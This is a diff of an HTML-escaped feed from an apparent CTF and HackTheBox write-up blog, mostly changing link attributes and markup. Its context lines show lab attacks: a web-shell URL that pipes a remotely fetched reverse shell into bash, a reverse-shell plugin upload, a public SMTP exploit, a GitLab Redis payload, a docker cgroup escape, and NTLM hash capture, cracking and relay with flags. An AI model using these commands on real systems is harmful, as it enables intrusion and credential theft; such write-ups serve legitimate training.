+&lt;img src=&#34;hacking-windows2.png&#34; width=&#34;400&#34; height=&#34;500&#34; /&gt;
 &lt;p&gt;You maybe already familar with windows as most of us grew using windows! But do you really know how it works? Have you dig into the configurations and tried to play with them and understood nothing?! &lt;br&gt;&lt;/p&gt;
 &lt;p&gt;You may 98% of the time use Linux as an attacker! But most of the time you can&amp;rsquo;t really know what OS you&amp;rsquo;re attacking! As we know most of the companies uses Windows and to be exact an Active Directory infrastructure. In order to attack a windows machine or trying to privesc to administrator you&amp;rsquo;ll need to understand the basics of Windows! &lt;br&gt;
 I don&amp;rsquo;t think you&amp;rsquo;ll need more resources about &amp;ldquo;Windows Basics&amp;rdquo; after completing this section it simply covers everything you need to know as a beginner! &lt;br&gt;&lt;/p&gt;
@@ -958,7 +1182,7 @@ This is an easy rated machine, we can manually check if this password works with
 &lt;hr&gt;
 &lt;p&gt;Let&amp;rsquo;s create our malicious plugin&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;I&amp;rsquo;ll use pentestmonkey&amp;rsquo;s php revshell &lt;a href=&#34;https://github.com/pentestmonkey/php-reverse-shell&#34;&gt;https://github.com/pentestmonkey/php-reverse-shell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ll use pentestmonkey&amp;rsquo;s php revshell &lt;a href=&#34;https://github.com/pentestmonkey/php-reverse-shell&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/pentestmonkey/php-reverse-shell&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;img src=&#34;rev.png&#34;&gt;
 &lt;p&gt;Let&amp;rsquo;s now upload thiss plugin&lt;/p&gt;
@@ -1124,7 +1348,7 @@ http 10.197.243.77  3128
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;We can grab an exploit from exploitdb&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;I&amp;rsquo;ll be using this exploit : &lt;a href=&#34;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&#34;&gt;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ll be using this exploit : &lt;a href=&#34;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf python3 exp.py 10.241.251.113 25 10.10.14.68 9001 j.nakazawa@realcorp.htb
 &lt;/code&gt;&lt;/pre&gt;
@@ -1196,14 +1420,14 @@ cd /home/admin
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;then  add the root as a principal to the database&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&#34;&gt;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;pre&gt;&lt;code&gt;add_principal root@REALCORP.HTB
 &lt;/code&gt;&lt;/pre&gt;
 &lt;img src=&#34;rootad.png&#34;&gt;
 &lt;p&gt;Now we can get login as root with &lt;code&gt;ksu&lt;/code&gt;&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://linux.die.net/man/1/ksu&#34;&gt;https://linux.die.net/man/1/ksu&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://linux.die.net/man/1/ksu&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://linux.die.net/man/1/ksu&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;img src=&#34;root.png&#34;&gt;
 &lt;p&gt;And we rooted the box!&lt;/p&gt;
@@ -1341,7 +1565,7 @@ echo serialize($bad);
 &lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;http://10.10.10.223/cmd.php?cmd=curl%20http://10.10.14.105:8000/x|bash
 &lt;/code&gt;&lt;/pre&gt;
 &lt;blockquote&gt;
-&lt;p&gt;x is just a reverse shell &lt;a href=&#34;https://resh.vercel.app/&#34;&gt;https://resh.vercel.app/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;x is just a reverse shell &lt;a href=&#34;https://resh.vercel.app/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://resh.vercel.app/&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;img src=&#34;foothold.png&#34;&gt;
 &lt;hr&gt;
@@ -1460,7 +1684,7 @@ Discovered open port 5000/tcp on 10.10.10.226
 &lt;p&gt;Another interesting thing is the file upload that takes a msfvenom template!&lt;/p&gt;
 &lt;p&gt;Searching a bit in google can lead us to what we want! We can craft a Android payload template and get a shell on the box&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&#34;&gt;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Payload:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3
@@ -1583,7 +1807,7 @@ etc..
 &lt;img src=&#34;CRLF1.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
 &lt;p&gt;This vulnerability will come handy later on by adding newlines to our payload and that&amp;rsquo;s by chaining both of these vulnerabilities in order to get an RCE.&lt;/p&gt;
 &lt;p&gt;So now we understood what will be causing the RCE, we can dive in and get our shell!&lt;/p&gt;
-&lt;p&gt;We&amp;rsquo;ll be using the payload mentioned here: &lt;a href=&#34;https://hackerone.com/reports/299473&#34;&gt;https://hackerone.com/reports/299473&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll be using the payload mentioned here: &lt;a href=&#34;https://hackerone.com/reports/299473&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://hackerone.com/reports/299473&lt;/a&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;
  multi
  sadd resque:gitlab:queues system_hook_push
@@ -1652,7 +1876,7 @@ etc..
 &lt;img src=&#34;Priv.png&#34; style=&#34;filter: drop-shadow(0 0 0.75rem crimson);&#34;&gt;
 &lt;p&gt;It seems like we&amp;rsquo;re in a privileged docker!&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;An interesting blog post to check ! &lt;a href=&#34;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&#34;&gt;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;An interesting blog post to check ! &lt;a href=&#34;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;pre&gt;&lt;code&gt;mkdir /tmp/cgrp &amp;amp;&amp;amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;amp;&amp;amp; mkdir /tmp/cgrp/x
  
@@ -1802,8 +2026,8 @@ UNKNOWN COMMAND
 &lt;h1 id=&#34;p-stylecolorredpreparing-the-debuggerp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Preparing the debugger&lt;/p&gt;&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;I&amp;rsquo;ll be using Immunity debbuger &amp;amp; mona for this
-&lt;a href=&#34;https://www.immunityinc.com/products/debugger/&#34;&gt;https://www.immunityinc.com/products/debugger/&lt;/a&gt;
-&lt;a href=&#34;https://github.com/corelan/mona&#34;&gt;https://github.com/corelan/mona&lt;/a&gt;&lt;/p&gt;
+&lt;a href=&#34;https://www.immunityinc.com/products/debugger/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.immunityinc.com/products/debugger/&lt;/a&gt;
+&lt;a href=&#34;https://github.com/corelan/mona&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/corelan/mona&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;After opening the executeable with the debbuger
 we first we&amp;rsquo;re gonna set a working directory for mona at the buttom of the debbuger window&lt;/p&gt;
@@ -2091,7 +2315,7 @@ Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;/blockquote&gt;
 &lt;p&gt;Bascially we&amp;rsquo;re gonna abuse arbitrary file read via the UploadsRewriter when moving an issue, and get the &lt;code&gt;secret_key_base&lt;/code&gt; from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml then generate the cookie payload via our own gitlab instance with the key that we got!&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;If you wanna read more about this exploit: &lt;a href=&#34;https://hackerone.com/reports/827052&#34;&gt;https://hackerone.com/reports/827052&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;If you wanna read more about this exploit: &lt;a href=&#34;https://hackerone.com/reports/827052&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://hackerone.com/reports/827052&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Let&amp;rsquo;s now try to read /etc/passwd from the box&lt;/p&gt;
 &lt;ul&gt;
@@ -2159,7 +2383,7 @@ puts cookies[:cookie]
 &lt;p&gt;So now we&amp;rsquo;re on a docker container as the &lt;strong&gt;git&lt;/strong&gt; user!
 The trick now is to change the gitlab&amp;rsquo;s admin (who is id=1) password&lt;/p&gt;
 &lt;p&gt;Going through gitlab&amp;rsquo;s docs to get the right syntax
-&lt;a href=&#34;https://docs.gitlab.com/ee/security/reset_user_password.html&#34;&gt;https://docs.gitlab.com/ee/security/reset_user_password.html&lt;/a&gt;&lt;/p&gt;
+&lt;a href=&#34;https://docs.gitlab.com/ee/security/reset_user_password.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.gitlab.com/ee/security/reset_user_password.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;It may take a while to run&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-rails console -e production
 &lt;/code&gt;&lt;/pre&gt;
@@ -2216,7 +2440,7 @@ And we rooted the box!
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;p-stylecolorgreendirb-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Dirb scan &lt;/p&gt;&lt;/h2&gt;
 &lt;blockquote&gt;
-&lt;p&gt;You can clone the SecLists repo from here &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can clone the SecLists repo from here &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;We already got  &lt;strong&gt;/weather/&lt;/strong&gt; from the nmap results, let&amp;rsquo;s see enum more&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dirb -R http://10.10.10.218/weather/ /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt 
@@ -2296,7 +2520,7 @@ And it worked! Let&#39;s login to the user
 &lt;p&gt;&lt;code&gt;littlebear&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Let&amp;rsquo;s try to switch to the root user with this password!&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&#34;&gt;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;doas su
 &lt;/code&gt;&lt;/pre&gt;
@@ -2507,7 +2731,7 @@ After manually trying to switch to these users, it turns out to be cry0l1t3&amp;
 &lt;p&gt;And execute&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;sudo /usr/bin/composer --working-dir=fake run-script shell
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&#34;root.png&#34; &gt;&lt;/p&gt;
+&lt;img src=&#34;root.png&#34; &gt;
 &lt;p&gt;And we rooted the box! &lt;br/&gt;
 &lt;code&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/p&gt;
 &lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
@@ -2535,74 +2759,117 @@ So basically we&amp;rsquo;re going to provide our network interface to responder
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;And we wait until a user accidentally make a mistake while writing his hostname instead of providing a legitimate hostname in the DNS.
 And get his NTLMv2 hash.&lt;/p&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220183501.png&#34; /&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Username:naruto
+&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220183501.png&#34; /&gt;
+```
+Username:naruto
 Hash: naruto:::0099db0783fde495:F2C5BF32BD89C576A1E95A54D4BF7664:0101000000000000C0653150DE09D20121A6F48A2D912BFA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000B1EAB93D8ABDC394076EB8F8CA0CCF66489376BD473809472A94F666423EA3C20A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0030002E0036000000000000000000
-&lt;/code&gt;&lt;/pre&gt;
+```
 &lt;h2 id=&#34;p-stylecolorgreencracking-the-hash-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Cracking the HASH &lt;/p&gt;&lt;/h2&gt;
 &lt;p&gt;We&amp;rsquo;re going to use hashcat and rockyou wordlist to crack this hash,Basically we just need the Hash-Mod
 First of all, we&amp;rsquo;re going to look for NTLMv2 Hash-Mod&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184300.png&#34; /&gt;
-Finally run hashcat,&lt;/p&gt;
+&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184300.png&#34; /&gt;
+Finally run hashcat,
 &lt;pre&gt;&lt;code&gt;hashcat.exe -m 5600 hash.txt rockyou.txt
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184655.png&#34; /&gt;
-And we wait until hashcat cracks it&lt;/p&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184750.png&#34; /&gt;&lt;/p&gt;
+&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184655.png&#34; /&gt;
+And we wait until hashcat cracks it
+&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184750.png&#34; /&gt;
+```
+&lt;p&gt;NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;
-NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd 
+
+
+
+## &amp;lt;p style=&amp;quot;color:Green&amp;quot;&amp;gt;FLAG&amp;lt;/p&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;p-stylecolorgreenflagp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;FLAG&lt;/p&gt;&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;Securinets{kelvinP@ssw0rd}
+&lt;p&gt;Securinets{kelvinP@ssw0rd}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# &amp;lt;p style=&amp;quot;color:RED&amp;quot;&amp;gt;Task: IPv6 Attack &amp;lt;/p&amp;gt;
+##  &amp;lt;p style=&amp;quot;color:Green&amp;quot;&amp;gt;Preparing for the Attack  &amp;lt;/p&amp;gt;
+
+We&#39;re going to start with gathering informations about the network
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&#34;p-stylecolorredtask-ipv6-attack-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Task: IPv6 Attack &lt;/p&gt;&lt;/h1&gt;
-&lt;h2 id=&#34;p-stylecolorgreenpreparing-for-the-attack--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Preparing for the Attack  &lt;/p&gt;&lt;/h2&gt;
-&lt;p&gt;We&amp;rsquo;re going to start with gathering informations about the network&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo ifconfig
+&lt;p&gt;sudo ifconfig&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220182306.png&amp;quot; /&amp;gt;
+`Network address: 10.0.0.0/24`
+
+Let&#39;s now find the hosts IPs, It may take a while
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220182306.png&#34; /&gt;
-&lt;code&gt;Network address: 10.0.0.0/24&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Let&amp;rsquo;s now find the hosts IPs, It may take a while&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;nmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk &#39;{print $6}&#39; | uniq &amp;gt; ips.txt 
+&lt;p&gt;nmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk &amp;lsquo;{print $6}&amp;rsquo; | uniq &amp;gt; ips.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+
+Now let&#39;s an nmap scan on the result
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Now let&amp;rsquo;s an nmap scan on the result&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A --open -oA nmap
+&lt;p&gt;sudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A &amp;ndash;open -oA nmap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+Or you can directly
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Or you can directly&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap 
+&lt;p&gt;sudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220195053.png&amp;quot; /&amp;gt;
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220195212.png&amp;quot; /&amp;gt;
+After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller
+
+We can get the domain name either from the nmap results or by enumerating the ldap
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220195053.png&#34; /&gt;
-&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220195212.png&#34; /&gt;
-After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller&lt;/p&gt;
-&lt;p&gt;We can get the domain name either from the nmap results or by enumerating the ldap&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ldapsearch -h 10.0.0.7 -x -s base namingcontexts
+&lt;p&gt;ldapsearch -h 10.0.0.7 -x -s base namingcontexts&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220194446.png&amp;quot; /&amp;gt;
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220194446.png&#34; /&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;namingcontexts: DC=SECURINETS,DC=local
-// SECURINETS.local is the domain name
+&lt;p&gt;namingcontexts: DC=SECURINETS,DC=local
+// SECURINETS.local is the domain name&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+
+##  &amp;lt;p style=&amp;quot;color:Green&amp;quot;&amp;gt;Attacking  &amp;lt;/p&amp;gt;
+So basically we&#39;re going to  acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( https://github.com/fox-it/mitm6 ) which will act as IPv6 Router during the attack  and ntlmrelayx  ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.
+
+
+Let&#39;s start by setting up mitm6
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;p-stylecolorgreenattacking--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Attacking  &lt;/p&gt;&lt;/h2&gt;
-&lt;p&gt;So basically we&amp;rsquo;re going to  acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( &lt;a href=&#34;https://github.com/fox-it/mitm6&#34;&gt;https://github.com/fox-it/mitm6&lt;/a&gt; ) which will act as IPv6 Router during the attack  and ntlmrelayx  ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.&lt;/p&gt;
-&lt;p&gt;Let&amp;rsquo;s start by setting up mitm6&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo mitm6 -d SECURINETS.local
+&lt;p&gt;sudo mitm6 -d SECURINETS.local&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+
+
+Let&#39;s now set up our ntlm relay
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Let&amp;rsquo;s now set up our ntlm relay&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t
+&lt;p&gt;sudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220200338.png&amp;quot; /&amp;gt;
+And wait until we get something juicy
+
+
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220200440.png&amp;quot; /&amp;gt;
+A folder l00t has been created which contains informations about the AD
+
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220200621.png&amp;quot; /&amp;gt;
+
+
+
+And we grab our flag
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200338.png&#34; /&gt;
-And wait until we get something juicy&lt;/p&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200440.png&#34; /&gt;
-A folder l00t has been created which contains informations about the AD&lt;/p&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200621.png&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;And we grab our flag&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;cat * | grep Securinets
+&lt;p&gt;cat * | grep Securinets&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+&amp;lt;img class=&amp;quot;special-img-class&amp;quot; src=&amp;quot;Pasted image 20210220201212.png&amp;quot; /&amp;gt;
+## &amp;lt;p style=&amp;quot;color:Green&amp;quot;&amp;gt; Flag  &amp;lt;/p&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220201212.png&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;p-stylecolorgreen-flag--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt; Flag  &lt;/p&gt;&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}
+&lt;p&gt;Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;## Thanks for reading hope you enjoyed it!
+
+
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
 </description>
     </item>
     
@@ -2657,15 +2924,15 @@ $$&lt;/p&gt;
 {{% fragment %}} Three {{% /fragment %}}
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Press &lt;code&gt;Space&lt;/code&gt; to play!&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;fragment &#34; &gt;
-One
+&lt;span class=&#34;fragment &#34; &gt;
+   One 
 &lt;/span&gt;
 &lt;span class=&#34;fragment &#34; &gt;
-&lt;strong&gt;Two&lt;/strong&gt;
+   **Two** 
 &lt;/span&gt;
 &lt;span class=&#34;fragment &#34; &gt;
-Three
-&lt;/span&gt;&lt;/p&gt;
+   Three 
+&lt;/span&gt;
 &lt;hr&gt;
 &lt;p&gt;A fragment can accept two optional parameters:&lt;/p&gt;
 &lt;ul&gt;
